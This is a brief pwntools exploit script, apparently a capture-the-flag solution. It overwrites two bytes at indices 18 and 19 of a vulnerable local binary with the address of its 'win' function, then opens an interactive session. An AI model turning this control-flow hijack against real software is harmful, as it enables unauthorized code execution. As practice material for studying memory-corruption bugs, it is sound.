from pwn import *

#io = process("./vuln")
io = remote("localhost",30004)
elf = ELF("./vuln")

win = hex(elf.symbols["win"])
print(win)

io.recvuntil(b"type index>")
io.sendline(b"18")
io.recvuntil(b"type value in hex>")
io.sendline(bytes(win[-2:], 'utf-8'))

io.recvuntil(b"type index>")
io.sendline(b"19")
io.recvuntil(b"type value in hex>")
io.sendline(bytes(win[-4:-2], 'utf-8'))

io.interactive()
